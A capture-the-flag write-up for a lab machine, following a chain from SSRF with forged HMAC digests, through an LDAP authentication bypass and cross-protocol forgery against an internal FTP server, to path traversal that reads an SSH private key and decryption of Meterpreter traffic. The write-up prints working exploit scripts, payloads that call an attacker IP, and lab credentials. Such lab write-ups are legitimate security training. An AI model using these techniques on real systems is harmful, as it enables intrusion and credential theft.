Followed a writeup for the entire lab. This has way to many new things to learn within a week :) (The write up kinda falls apart towards the end. I might fix this... (lol no i wont :)))
IP: 10.10.11.163
# Enumeration
## Nmap
```bash
Nmap scan report for 10.10.11.163
Host is up (0.0064s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.21.6
|_http-server-header: nginx/1.21.6
|_http-title: Did not follow redirect to http://www.response.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Redirect to `www.response.htb`

Added both `www.response.htb` and `response.htb` to /etc/hosts

## Port 80
Nothing interesting that stands out, index.html

## Gobuster
```bash
gobuster -m dir -u http://www.response.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
```

status page.

## Status page
Checking the network tab shows `proxy.response.htb`

Gets a weird page. `main.js.php`

An OPTIONS request?

Allowed methods 
```
DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
```

There is a post request to `/fetch`
```json
"url":"http://api.response.htb/",
"url_digest":"582cca8fd9e8eb387d8e462fb5bd73a8ae458c40801aa4754b9132c28039bd07",
"method":"GET","session":"5d7bc1932209c9dfc12b272d56604546",
"session_digest":"aadadebf751e64d700ab9519d670106349ad1f96f6358353d39f9815008a7066"
```

This returns a base64 blob:
```json
{
  "api_version": "1.0",
  "endpoints": [
    {
      "desc": "get api status",
      "method": "GET",
      "route": "/"
    },
    {
      "desc": "get internal chat status",
      "method": "GET",
      "route": "/get_chat_status"
    },
    {
      "desc": "get monitored servers list",
      "method": "GET",
      "route": "/get_servers"
    }
  ],
  "status": "running"
}
```

This is also sent to `api.response.htb`

Going to `api.response.htb` gives a 403

Checking each fetch response.
```bash
# get_chat_status
{
  "status": "running",
  "vhost": "chat.response.htb"
}
# get_servers
{
  "servers": [
    {
      "id": 1,
      "ip": "127.0.0.1",
      "name": "Test Server"
    }
  ]
}
```

Another vhost.
## Cert bypass
Going to the chat subdomain also gives a 403. Lets try to change the `fetch` request to access `chat.response.htb` instead of `api.response.htb`

Changing only the url gives a url_digest error. Both the session and session_digest stay the same.

It is probs a HMAC which means it needs a secret. Lets try the PHPSESSID cookie.

```HTTP
GET /status/main.js.php HTTP/1.1
Host: www.response.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.response.htb/status/main.js.php
Cookie: PHPSESSID=http://chat.response.htb
```
This errors out but still gives a session_digest. Swapping this out gives back a page!

This page has a reference to the source code at `files/chat_source.zip`
# Proxy
## Python Script
Creating a python script to automate the above exploit.
```python
import requests
import re
import base64
  
def get_digest(url):
	cookie = {"PHPSESSID":url}
	r = requests.get("http://www.response.htb/status/main.js.php",cookies=cookie)
	res = re.search(r"'session_digest':'([0-9a-f]*)'};",r.text)
	print("Session digest: "+res.group(1))
	return res.group(1)

def download_url(url):
	url_digest = get_digest(url)
	payload = {
	"url":url,
	"url_digest":url_digest,
	"method":"GET",
	"session":"e221eb82bca259b796c50de6e07dd689",
	"session_digest":"6ead98cc96f72e4203e77297a5ceb52ac5470526d614210409b3574ff1e22a56"
	}
	r = requests.post("http://proxy.response.htb/fetch",json=payload)
	return r

  
r = download_url("http://chat.response.htb/files/chat_source.zip")
file = base64.b64decode(r.json()["body"])
with open("chat_source.zip",'wb') as f:
f.write(file)
```
This will also download the source of the chat application.

The source code has creds of `guest:guest` to authenticate users on the app.

## Adding MITM functionality
The current page says that we need to include the js which means we need to forward everything through this proxy.
```python
class Server(SimpleHTTPRequestHandler):
	def do_GET(self):
		print(self.path)
		r = download_url(self.path[1:])
		self.send_response(r.status_code)
		self.send_header("Content-type","text/html")
		self.end_headers()
		data = r.json()
		decoded = base64.b64decode(data["body"])
		self.wfile.write(decoded)
		
HTTPServer(("",3000), Server).serve_forever()
```

This returns the login page for the chat app.

Trying to login with `guest:guest` errors as the proxy cant reach `chat.response.htb` due to `CORS Missing Allow Origin`. Also need to make the content type dynamic so it loads the css and js properly.
```python
def get_mimetype(path):
	mime = mimetypes.MimeTypes()
	mime_type = mime.guess_type(path)
	if mime_type:
		return mime_type[0]
	return "text/html"
```
Now the js and css looks better.

To fix the CORS errors we can change all the requests to `chat.response.htb` to go to the server on localhost.
```python
if self.path.endswith(".js"):
	decoded = decoded.replace(b"chat.response.htb",b"localhost:3000")
```

This stops the CORS error and give a 501 due to a POST request.
```python
def do_POST(self):
	self.data_string = self.rfile.read(int(self.headers['Content-Length']))
	if self.data_string:
		r = download_url("POST",self.path[1:],self.data_string)
	else:
		r = download_url("POST",self.path[1:])
	self.send_response(r.status_code)
	self.send_header("Content-type",get_mimetype(self.path))
	self.end_headers()
	data = r.json()
	self.wfile.write(base64.b64decode(data["body"]))
```

Once on the app the user bob wants to talk to an admin. So lets try to auth as admin.

# Chat App
## Priv esc
The way the app checks for users is via a ldap request to `ldap.response.htb`. This can be changed to our local host which can bypass the password check, as we can set it.
### Exploiting LDAP auth
Checking that it can reach the local ldap port.
```bash
nc -lvnp 389
```
This works.
```bash
06`1%uid=admin,ou=users,dc=response,dc=htb�admin
```

Instead of creating a ldap server we can just send back the success response that ldap would send.
```hex
300c02010161070a010004000400
```
This can be done by echo-ing the code into nc
```bash
echo 300c02010161070a010004000400 | xxd -r -p | sudo nc -lkvnp 389
```

This logs in as the admin :)

(Instead of using burpsuite to change the ldap server you could also do a replace in the server)

## Talking to bob
Now as the admin we can talk to bob.

He says there is an ftp server with a firewall issue, and that the admin mentioned something about sending him a js file.

FTP info
```
172.18.0.6:2121

ftp_user:Secret12345
```

See if he will connect to a url that i send.

He does.

## Create a CSPF
Cross site Protocol forgery

This will be used to get bob to connect to the FTP server for us, so we can see whats on it.
```js
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://127.0.0.1:2121', true);
xhr.send('USER ftp_user\r\nPASS Secret12345\r\nPORT 10,10,14,67,35,41\r\nLIST\r\n');
```

The port (35,41) is in packed format so a weird base 2 thing
```
35*256+41 = 9001
```

Also need a html file.
```html
<html>
  <script src='payload.js'></script>
</html>
```

Testing locally and it works. All that needs to be changed is the IP addr in the `payload.js`.

Spin up a webserver and a nc listener, and it all works.

There is a creds.txt file. Getting the file by using `RETR creds.txt` in the js file instead of LIST, gives much loved ssh creds as bob! :D
```txt
bob:F6uXVwEjdZ46fsbXDmQK7YPY3OM
```

User flag:
```
75ffaa80f49322f15f292765fd893411
```

# Lateral movement on the box
The scryh user has a scan folder which has `scan.sh` and `send_report.py`

The data folder has countrynames and state information, which is weird.
## Scan.sh
There is a ldap password for the admin ldap user. `aU4EZxEAOnimLNzk3`

Looking over the script.

The logs are stored in output/scan, It gets IP's form ldap, uses nmap to scan for a few things on 443 and creates a pdf.

It also gets the manager information via ldap.

mx nslookup on the IP.

### Running the ldap commands manually
Helps to understand what the script is doing.
```bash
bind_dn='cn=admin,dc=response,dc=htb'
pwd='aU4EZxEAOnimLNzk3'
/usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb
```

This gives back an ip of `172.18.0.2`

Looking at how the smtp\_server is set up the ip must be running dns so it can resolve. As this is the only thing being passed.

## NSE scripts.
Checking when the scripts were created `ssl-cert.nse` has a different date. Checking this version against the normal nmap script shows the following difference.
```lua
local function get_stateOrProvinceName(subject)
  stateOrProvinceName = read_file('data/stateOrProvinceName/' .. subject['stateOrProvinceName'])
  if (stateOrProvinceName == '') then
    return 'NO DETAILS AVAILABLE'
  end
  return stateOrProvinceName
end
```

LFI on line 2 not checking for `../../` (input sanitation)
tracing this back it comes from the certificate that we can create.

## LFI time
### Setup
We need a LDAP server, a DNS server and a SMTP server.
#### LDAP
Make a fake ldap entry
```bash
# TestServer, servers, response.htb
dn: cn=mail.response-test,ou=servers,dc=response,dc=htb
objectClass: top
objectClass: ipHost
objectClass: device
cn: myserver  
manager: uid=who,ou=customers,dc=response,dc=htb
ipHostNumber: 10.10.14.67
```

Add the entry
```bash
ldapadd -D 'cn=admin,dc=response,dc=htb' -w $pwd -f ./eljay.ldif
```

This reaches back to us!

#### Certificate
```bash
openssl req -x509 -nodes -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 2
```

Checking everything works before doing the LFI.

Creating a ssl server in python.
```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl

httpd = HTTPServer(('',443),SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket,keyfile='./key.pem',certfile='./cert.pem', server_side=True)
httpd.serve_forever()
```

This works (can check by doing `https://localhost`)

#### DNS server
dns.conf file
```bash
address=/mail.response-test.htb/10.10.14.67
```

Start the dnsmasq
```bash
dnsmasq -p 8053 -C dns.conf
```

iptables reroute
```bash
sudo iptables -A PREROUTING -t nat -p udp -s 10.10.11.163 --dport 53 -j REDIRECT --to-ports 8053

sudo iptables -A PREROUTING -t nat -p tcp -s 10.10.11.163 --dport 53 -j REDIRECT --to-ports 8053
```

Checking with dig on the box.
```bash
dig mail.response-test.htb @10.10.14.67 +short
```

This works, now need to do add the mx portion to the `dns.conf` file.
```bash
mx-host=response-test.htb,mail.response-test.htb,0
```

#### Python SMTP server
```bash
sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.67:25
```

## Testing
Finally seeing if this works. (change the ldif file to have the right cn)
```bash
ldapadd -D 'cn=admin,dc=response,dc=htb' -w aU4EZxEAOnimLNzk3 -f ./eljay.ldif
```

**1 HOUR OF DEBUGGING LATER** (Turns out it doesn't like the password as an env var.)

Oh wow look it works.

Lets look at the pdf. (Need to remove the `b'.*'`)
```sed
%s/^b'//g
%s/'$//g
```

Yea the pdf shows the state which we can use for the LFI.

## The LFI bit
Change some info when making the cert
```text
Country Name (2 letter code) [AU]:  
State or Province Name (full name) [Some-State]:../../../../../../../home/scryh/.ssh/id_rsa
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Run the ldapadd and hope it works.

It works, we are now scryh. *pls let me die now :)*

# Priv esc
## pcap file
pcap and pdf in the incident directory. pdf talks about some meterpreter payload there is also a core dump and a zip archive was taken.

Let's look at the pcap file.

It's a huge file.

filter by default meterpreter port of 4444
### Structure of a meterpreter packet
It follows this structure.
```text
XOR KEY  (4 bytes), session guid (16 bytes), encryption flags (4 bytes), packet length (4 bytes) tvl packets ( N bytes)
```

If the packet is encrypted the aes_iv is 16 bytes before the tvl

Looking at the first meterpreter packet the xor key will be:
```
44 d2 90 53
```

The packet length will be the xor of `91 38`
```python
hex(0x9138 ^ 0x9053)
0x16b
```

The entire packet is `0x183` so the tvl size is
```python
0x183-0x16b
24
```

### packets -> binary file
PYTHON SCRIPT TIME
```python
from scapy.all import *

tcp_stream = b''
def handle_packet(packet):
	global tcp_stream
	if TCP in packet:
		if packet[TCP].sport == 4444 or packet[TCP].dport ==4444:
			tcp_stream +=bytes(packet[TCP].payload)
  
sniff(offline='dump.pcap',prn=handle_packet)
f = open('thepackets.raw','wb')
f.write(tcp_stream)
f.close()
```

### Get AES_IV
There is a tool called bulk extractor on github that can get the aes key from a memory dump.

This works cause AES has checkable entropy and something similar to a checksum

```bash
bulk_extractor -o bulk_output/ core.auto_update
```

TaDa! there is a aes.txt file with the aes key.
```python
aes_key = b'f2003c143dc8436f39ad6f8fc4c24f3d35a35d862e10b4c654aedc0ed9dd3ac5'
```
*back to the python scripts*

```python
from Crypto.Cipher import AES
import lookup
def xor(data,key):
    r = b''
    for i in range(len(data)):
        r+= bytes([data[i] ^ key[i%len(key)]])
    return r
aes_key = bytes.fromhex('f2003c143dc8436f39ad6f8fc4c24f3d35a35d862e10b4c654aedc0ed9dd3ac5')
f = open('thepackets.raw','rb')
while True:
    xor_key = f.read(4)
    session_key = xor(f.read(16),xor_key)
    enc_flag = xor(f.read(4),xor_key)
    packet_len = xor(f.read(4),xor_key)
    packet_type = xor(f.read(4),xor_key)
    packet_len_int = int.from_bytes(packet_len,'big')
    if int.from_bytes(enc_flag,'big') ==0:
        tlv = xor(f.read(packet_len_int-8),xor_key)
    else:
        aes_iv = xor(f.read(16),xor_key)
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        tlv = xor(f.read(packet_len_int-24),xor_key)
        tlv = cipher.decrypt(tlv)
    while len(tlv) > 0:
        tlv_len = tlv[:4]
        tlv_type = tlv[4:8]
        tlv_type_1 = tlv_type[0:2]
        tlv_type_2 = int.from_bytes(tlv_type[2:4],'big')
        tlv_len_int = int.from_bytes(tlv_len,'big')
        tlv_value = tlv[8:tlv_len_int]
        try:
            print(f"Session Key: {session_key}\tpacket length: {packet_len_int}\tTLV: {lookup.MSFType(tlv_type_2).name}")
            if lookup.MSFType(tlv_type_2).name == "TLV_TYPE_CHANNEL_DATA":
                f2 = open("file.zip",'ab')
                f2.write(tlv_value)
                f2.close()
        except:
            print(f"Unknown TLV type: {tlv_type_2}")
        
        tlv = tlv[tlv_len_int:]
f.close()

```

big packet. Must be the zip file.

Lets go it worked.

SS with a ssh private key as root. Type it out like a real hacker. (Its 4am now)

Decode the key then xxd and make sure that it starts with `c100`

get the bit we want (use 00 as splits)
```bash
base64 -d key.64 |xxd -seek 29 -l 193
```

Use rsa ctf tool to dump n and e from the authorized_keys

then use the hex from above as q and it spits out the key

root.txt
```
da07db9920310022ecc5c22c541ae0f3
```

FIN
